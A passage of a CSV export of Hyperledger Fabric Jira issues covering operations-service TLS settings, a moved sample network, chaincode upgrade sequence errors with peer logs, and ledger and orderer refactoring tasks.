- ORDERER_GENERAL_TLS_CLIENTAUTHREQUIRED=true
- ORDERER_GENERAL_TLS_CLIENTROOTCAS=/var/hyperledger/tls/ca.crt
volumes:
- ../crypto-config/ordererOrganizations/example.com/orderers/orderer0.example.com/msp:/var/hyperledger/msp
- ../crypto-config/ordererOrganizations/example.com/orderers/orderer0.example.com/tls:/var/hyperledger/tls
- ../network-config/:/var/hyperledger/configs
depends_on:
- kafka0
- kafka1
- kafka2
- kafka3
networks:
behave:
aliases:
- ${CORE_PEER_NETWORKID}
ports:
- 7050:7050
- 4443:4443
 ",,denyeart,SharedMocha,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01blv:",,,,Unset,Unset,,"Create a network using docker containers and use the above environment variables to enable Operating service and Prometheus and check https is not enabled.
",,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,SharedMocha,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"04/May/20 1:08 PM;denyeart;[~SharedMocha] It is already possible to specify that TLS is required, see: https://hyperledger-fabric.readthedocs.io/en/latest/operations_service.html#operations-security

If that doesn't address the concern, could you clarify what is still missing?;;;","05/May/20 6:37 AM;SharedMocha;Hi [~denyeart] Thanks for your comments.  I will add the config metrics to docker container and test it and confirm.

One of the issues I see is, Prometheus or stand containers are required to be part of the fabric bridge network for getting metrics from peers and orderer. Is there a way we can pull metrics without adding them to fabric bridge network?;;;","06/May/20 8:05 AM;SharedMocha;Hi [~denyeart] 

According to docs -[https://hyperledger-fabric.readthedocs.io/en/release-2.0/operations_service.html]

I am able to enable TLS. But I keep running into an issue  that asks me for client/mutual auth even though I didn't enable it. My goal is to setup HTTPS for operating service but not enable client auth. Let me know if I should close this and create a separate defect for that;;;","06/May/20 8:18 AM;denyeart;[~SharedMocha] The same document says:

""When TLS is enabled, a valid client certificate must be provided in order to access all resources unless explicitly noted otherwise below.""

""When clientAuthRequired is also enabled, the TLS layer will require a valid client certificate regardless of the resource being accessed.""

So, you must have a client cert for most of the operations when TLS is enabled.

This appears to be working as expected, so I'll close the issue.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
What happened to fabric-samples/basic-network?,FAB-17828,44985,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid,,sichen,sichen,03/May/20 2:24 AM,04/May/20 3:44 AM,28/Oct/23 3:10 AM,04/May/20 3:44 AM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"I'm going through the Commercial Paper Tutorial ([https://hyperledger-fabric.readthedocs.io/en/release-1.4/tutorial/commercial_paper.html)]   It says

$ cd fabric-samples/basic-network

$ ./start.sh

 

But there's no basic-network from [https://github.com/hyperledger/fabric-samples]",,btl5037,sichen,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bm3:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,sichen,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"03/May/20 2:28 AM;btl5037;You are looking at release-1.4 branch instruction, but the link you've provided is to the master branch of fabric-samples. We moved all of the samples to the new test-network. Find the instructions here for using the new test-network with commercial paper: [https://hyperledger-fabric.readthedocs.io/en/release-2.1/tutorial/commercial_paper.html];;;","03/May/20 3:18 AM;sichen;Thank you!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
chaincode upgrade ,FAB-17829,44986,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Works as Expected,,mariya,mariya,03/May/20 1:10 PM,04/May/20 4:42 PM,28/Oct/23 3:10 AM,04/May/20 4:42 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"I have two orgs OrgA and OrgB, installed chaincode on both org's and executed transactions successfully (peer lifecycle)

Chaincode version v01
 Sequence number : 1
{code:java}
peer:
 Version: 2.1.0
 Commit SHA: 1bdf975
 Go version: go1.14.1
 OS/Arch: linux/amd64
 Chaincode:
  Base Docker Label: org.hyperledger.fabric
  Docker Namespace: hyperledger
{code}
I want to upgrade my chain code  on both org's.  Document does not clear exact steps to be followed to upgrade chain code.

*Upgrade step:* 
 Chaincode version v01
 Sequence number : 2

I followed below steps and getting error
{code:java}
Installing chaincode on peer0....
+ peer lifecycle chaincode install kevlar-v10.tar.gz --cafile crypto-config/ordererOrganizations/example.io/orderers/orderer.example.io/msp/tlscacerts/tlsca.example.io-cert.pem
+ res=0
+ set +x2020-05-03 02:45:30.477 UTC [grpc] Infof -> DEBU 032 Channel Connectivity change to READY
2020-05-03 02:45:30.537 UTC [msp.identity] Sign -> DEBU 033 Sign: plaintext: 0ABF070A6208031A0C08CAE0B8F50510...FFE57F010000FFFFFCBB1BF100AC3A00
2020-05-03 02:45:30.537 UTC [msp.identity] Sign -> DEBU 034 Sign: digest: 9688D9CD2DFB57FEDF9C8C2DA9A4FAB82177CD9E22390A0B9FC029B173B2B9F9
2020-05-03 02:45:30.943 UTC [cli.lifecycle.chaincode] submitInstallProposal -> INFO 035 Installed remotely: response:<status:200 payload:""\nGkevlar:54c812a0eebc9ed13ed4c7fd5e3d4dee48cc711d093042c9f9715c4e0e9dd6df\022\006kevlar"" >
2020-05-03 02:45:30.944 UTC [cli.lifecycle.chaincode] submitInstallProposal -> INFO 036 Chaincode code package identifier: kevlar:54c812a0eebc9ed13ed4c7fd5e3d4dee48cc711d093042c9f9715c4e0e9dd6df
===================== Chaincode is installed on peer0.mk-h2 =====================
Installing chaincode on peer1....
+ peer lifecycle chaincode install kevlar-v10.tar.gz --cafile /hl-material/mk-h2/crypto-config/ordererOrganizations/example.io/orderers/orderer.example.io/msp/tlscacerts/tlsca.example.io-cert.pem
+ res=0
+ set +x
2020-05-03 02:45:31.593 UTC [msp.identity] Sign -> DEBU 033 Sign: plaintext: 0ABF070A6208031A0C08CBE0B8F50510...FFE57F010000FFFFFCBB1BF100AC3A00
2020-05-03 02:45:31.593 UTC [msp.identity] Sign -> DEBU 034 Sign: digest: DC46677EBE3B961E6F6842BECF80C17BD2A96D3F6616C32792BEEF4A7F709C81
2020-05-03 02:45:32.021 UTC [cli.lifecycle.chaincode] submitInstallProposal -> INFO 035 Installed remotely: response:<status:200 payload:""\nGkevlar:54c812a0eebc9ed13ed4c7fd5e3d4dee48cc711d093042c9f9715c4e0e9dd6df\022\006kevlar"" >
2020-05-03 02:45:32.021 UTC [cli.lifecycle.chaincode] submitInstallProposal -> INFO 036 Chaincode code package identifier: kevlar:54c812a0eebc9ed13ed4c7fd5e3d4dee48cc711d093042c9f9715c4e0e9dd6df
===================== Chaincode is installed on peer1.mk-h2 =====================.........
PACKAGE_ID is kevlar:54c812a0eebc9ed13ed4c7fd5e3d4dee48cc711d093042c9f9715c4e0e9dd6df
+ peer lifecycle chaincode approveformyorg -o orderer.fabric:7050 --tls --cafile /hl-material/mk-h2/crypto-config/ordererOrganizations/example.io/orderers/orderer.example.io/msp/tlscacerts/tlsca.example.io-cert.pem --channelID base-chan-01 --name kevlar --version v10 --init-required --package-id kevlar:54c812a0eebc9ed13ed4c7fd5e3d4dee48cc711d093042c9f9715c4e0e9dd6df --sequence 2 --waitForEvent
+ res=0
...
2020-05-03 02:45:32.731 UTC [grpc] Infof -> DEBU 03d Subchannel Connectivity change to READY
2020-05-03 02:45:32.731 UTC [grpc] UpdateSubConnState -> DEBU 03e pickfirstBalancer: HandleSubConnStateChange: 0xc0003f6e10, {READY <nil>}
2020-05-03 02:45:32.731 UTC [grpc] Infof -> DEBU 03f Channel Connectivity change to READY
2020-05-03 02:45:32.731 UTC [msp.identity] Sign -> DEBU 040 Sign: plaintext: 0ACD070A7008031A0C08CCE0B8F50510...66393731356334653065396464366466
2020-05-03 02:45:32.731 UTC [msp.identity] Sign -> DEBU 041 Sign: digest: 56B6DDC7250D5B594AC2B582865973EC6E9AE68E7BAD12082D3518EA790EED09
2020-05-03 02:45:32.735 UTC [msp.identity] Sign -> DEBU 042 Sign: plaintext: 0ACD070A7008031A0C08CCE0B8F50510...1C66381A8D067407619688AC76F1BB84
2020-05-03 02:45:32.735 UTC [msp.identity] Sign -> DEBU 043 Sign: digest: C5E2F915F73DD621824B600E62FABC7B3698C2B4E275736C2EBE85F3C93E1D32
2020-05-03 02:45:32.735 UTC [msp.identity] Sign -> DEBU 044 Sign: plaintext: 0A97070A3A08051A0608CCE0B8F50522...00120D1A0B08FFFFFFFFFFFFFFFFFF01
2020-05-03 02:45:32.735 UTC [msp.identity] Sign -> DEBU 045 Sign: digest: D4A1CB2DE195F0BD8E06E41308A969A842011D3C92BB4EA08B4310356E41A26A
2020-05-03 02:45:33.828 UTC [chaincodeCmd] ClientWait -> INFO 046 txid [3c505cda088f09c91d83d785a516dc32192e5adcdb23d6e553b4911ad34672bf] committed with status (VALID) at
===================== Chaincode definition approved on peer0.mk-h2 on channel 'base-chan-01' =====================
===================== Checking the commit readiness of the chaincode definition on peer0.mk-h2 on channel 'base-chan-01'... =====================
Attempting to check the commit readiness of the chaincode definition on peer0.mk-h2 ...10 secs
+ peer lifecycle chaincode checkcommitreadiness --channelID base-chan-01 --name kevlar --version v10 --sequence 2 --output json --init-required
+ res=1
+ set +x2020-05-03 02:45:54.438 UTC [grpc] UpdateSubConnState -> DEBU 031 pickfirstBalancer: HandleSubConnStateChange: 0xc000181050, {READY <nil>}
2020-05-03 02:45:54.438 UTC [grpc] Infof -> DEBU 032 Channel Connectivity change to READY
2020-05-03 02:45:54.472 UTC [msp.identity] Sign -> DEBU 033 Sign: plaintext: 0ACD070A7008031A0C08E2E0B8F50510...0212066B65766C61721A037631304001
2020-05-03 02:45:54.472 UTC [msp.identity] Sign -> DEBU 034 Sign: digest: 321D943DDFCE6610B0D6DD3673F1CC8C3511E7BA4265D43E44885C2E5F92CFB3Error: query failed with status: 500 - failed to invoke backing implementation of 'CheckCommitReadiness': requested sequence is 2, but new definition must be sequence 3!!!!!!!!!!!!!!! Check commit readiness result on peer0.mk-h2 is INVALID !!!!!!!!!!!!!!!!
{code}
what is correct steps should be followed to upgrade ?",,mariya,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bmb:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),mariya,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"04/May/20 4:42 PM;mariya;Resolved this issue and working as expected.
Need to maintain/update  sequence number (incremented), change the version string and also code changes.
If no code change package-ID wont change and so new version of chain code docker images wont be on peer. In this case your chaincode upgrade step wont show any error but inside peer docker wont be running (kind of confusion)  

Mariya;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
mv updateBatch bytes constructor to txmgr and refactor,FAB-17830,44987,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,04/May/20 3:56 PM,05/May/20 5:54 PM,28/Oct/23 3:10 AM,05/May/20 5:54 PM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,"Currently, we create the bytes representation of _updateBatch_ to compute the hash of updateBatch which would be included in the block along with the validation results. The utility for converting a _updateBatch_ to deterministic bytes is present in the _privacyenabledstate_ pkg. However, this utility is used only by the _txmgr_. Hence, we need to move the utility function to _txmgr_ pkg from _privacyenabledstate_ pkg.
",,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bmj:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Define generic constants/vars for ledger data format,FAB-17831,44988,44914,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wenjian,wenjian,wenjian,05/May/20 3:21 AM,07/May/20 12:12 AM,28/Oct/23 3:10 AM,07/May/20 12:12 AM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,,,,,,Currently Version1x and Version20 are defined in dataformat.go. These should be renamed to more generic names such as PreviousVersion and CurrentVersion.,,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bmr:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),wenjian,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"06/May/20 12:15 AM;wenjian;PR: [https://github.com/hyperledger/fabric/pull/1212];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
add test for commit hash in kvledger/tests,FAB-17832,44989,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,05/May/20 4:20 AM,12/May/20 9:05 PM,28/Oct/23 3:10 AM,12/May/20 9:05 PM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,,,,,,,,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bmz:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Configtx package should not allow setting signing identity for channel transactions,FAB-17833,44990,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,caod,caod,05/May/20 4:34 AM,07/May/20 4:52 AM,28/Oct/23 3:10 AM,07/May/20 4:52 AM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,After a conversation with [~jyellick] it was made clear that the MSP initialization for verifying and signing share the same paths hence we use the same type containing a signing identity for both. The signing identity is not actually supposed to be used for either the channel creation transaction or for the system channel genesis block and definitely should not be updatable in a config update transaction. We should go ahead and remove all support for setting the signing identity in the configtx package.,,caod,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzp",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/May/20 12:45 AM;tsharris;[https://github.com/hyperledger/fabric-config/pull/16];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Investigate potential side effects when manually modifying an organizations signing identity info,FAB-17834,44991,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid,,caod,caod,05/May/20 4:39 AM,05/May/20 6:27 AM,28/Oct/23 3:10 AM,05/May/20 6:22 AM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"Currently, a user can manually modify a signing identity info and submit it for a config update. Realistically this value should always be nil and we should never actually use it for anything but because it can be modifiable we should check to see if doing so could cause any unwanted side effects. One example would be setting a signing identity that will eventually expire which could invalidate the channel config. 

 

/cc [~jyellick]",,caod,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzvw",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"05/May/20 4:40 AM;caod;Depending on what we find out here it may be worth enforcing the signing identity is always nil the next time we add a new channel capability.;;;","05/May/20 6:19 AM;yacovm;# I don't think it's used in channel MSPs since they are validating MSPs
# MSP doesn't take into account expiration 
# I think this part shouldn't have been part of the protobuf in the first place, but that's another story;;;","05/May/20 6:22 AM;caod;Per Yacov's comments it appears there shouldn't be any unintended side effects so closing out this investigation;;;","05/May/20 6:25 AM;yacovm;I think there is something even better we can do, to close this story, though.
We can just remove the field from the protobuf definition and setup signing MSPs via a different code path.

The protobuf was there for verifying MSPs and not for local MSPs which are verifying MSPs that a private key was glued to them.
This would ensure 100% that there is no problem in setting it to not nil. ;;;","05/May/20 6:27 AM;yacovm;[~ales] [~adc] ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Skip node ous if not specified for new system channel genesis block or create channel tx,FAB-17835,44992,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,caod,caod,05/May/20 4:49 AM,07/May/20 12:44 AM,28/Oct/23 3:10 AM,07/May/20 12:44 AM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,Normally Node OUs are only added to the initial config if an MSP configuration file exists specifying the node ous. This configuration file is optional so the configtx package should also optionally set Node OUs if the values are specified in the passed in msp config.,,caod,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzq",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/May/20 12:44 AM;tsharris;[https://github.com/hyperledger/fabric-config/pull/18];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Discrepancy between configtx package and sampleconfig/configtx.yaml,FAB-17836,44993,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,caod,caod,05/May/20 5:09 AM,07/May/20 4:53 AM,28/Oct/23 3:10 AM,07/May/20 4:53 AM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"Although technically an orderer org should not have anchor peers defined, the sampleconfig/configtx.yaml has both orderer endpoints and anchor peers defined for the `SampleOrg` org. This works fine when creating a system channel with configtxgen because there are separate functions for NewOrdererOrg and NewApplicationOrg, but because the configtx package shares the same function `newOrgConfigGroup` there should be some check to ensure that when we are creating a new orderer org it definitely does not add anchor peers even if theyre specified in the case of the sample config, and vice versa no orderer endpoints if creating a new application org even if also specified (again like in the sample config). Implementation details for whether we want separate functions or a flag passed is up to the implementer.",,caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzzzqi",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add function in blockstore to export TxIDs,FAB-17837,44995,44705,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,manish-sethi,manish-sethi,manish-sethi,05/May/20 11:01 AM,11/May/20 1:07 PM,28/Oct/23 3:10 AM,11/May/20 1:07 PM,,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,,,,,,Add a function in blockstore that writes a byte stream of TxIDs,,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bnf:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),manish-sethi,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"05/May/20 11:07 AM;manish-sethi;https://github.com/hyperledger/fabric/pull/1211;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Expose in orderer config & hook into http server,FAB-17838,44996,40568,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tock,tock,tock,05/May/20 2:49 PM,07/May/20 6:33 PM,28/Oct/23 3:10 AM,07/May/20 3:36 PM,v2.x,,,,,,,,,,,,,fabric-orderer,,,,,,,,,0,,,,,,"Expose a configuration object for channel participation at the top level (like Metrics). Even though the participation API shares the same endpoint and TLS config with operations, placing it at the top level will allow us to separate these APIs to different endpoints in the future without changing the config structure.

Register the skeleton of a handler to the http server.",,tock,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bnn:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/May/20 6:33 PM;tock;https://github.com/hyperledger/fabric/pull/1218;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
List all channels & single channel REST API,FAB-17839,44997,40568,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tock,tock,tock,05/May/20 2:51 PM,20/May/20 4:37 PM,28/Oct/23 3:10 AM,20/May/20 4:37 PM,v2.x,,,,,,,,,,,,,fabric-orderer,,,,,,,,,0,,,,,,"Develop the handler functionality in response to:

`GET /participation/v1/channels`.

`GET /participation/v1/channels/my-channel`.",,tock,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bnv:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Join channel REST API,FAB-17840,44998,40568,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tock,tock,tock,05/May/20 2:52 PM,26/May/20 4:36 PM,28/Oct/23 3:10 AM,26/May/20 4:36 PM,v2.x,,,,,,,,,,,,,fabric-orderer,,,,,,,,,0,,,,,,"Here we intend to support only Content-Type  ""multipart/form-data"".
",,tock,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bo3:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove channel REST API,FAB-17841,44999,40568,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tock,tock,tock,05/May/20 2:52 PM,28/May/20 10:18 PM,28/Oct/23 3:10 AM,28/May/20 10:18 PM,v2.x,,,,,,,,,,,,,fabric-orderer,,,,,,,,,0,,,,,,,,tock,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bob:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
rm pvtdatastorage interfaces,FAB-17843,45004,44551,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,06/May/20 9:20 PM,07/May/20 1:11 AM,28/Oct/23 3:10 AM,07/May/20 1:11 AM,,,,,,,,,,v2.2.0,,,,fabric-ledger,,,,,,,,,0,ledger-refactoring,,,,,"As we have only one implementation of the pvtdatastore and not planning to any a new one, we can safely remove the interface. This also helps in code navigation.
",,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bpf:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
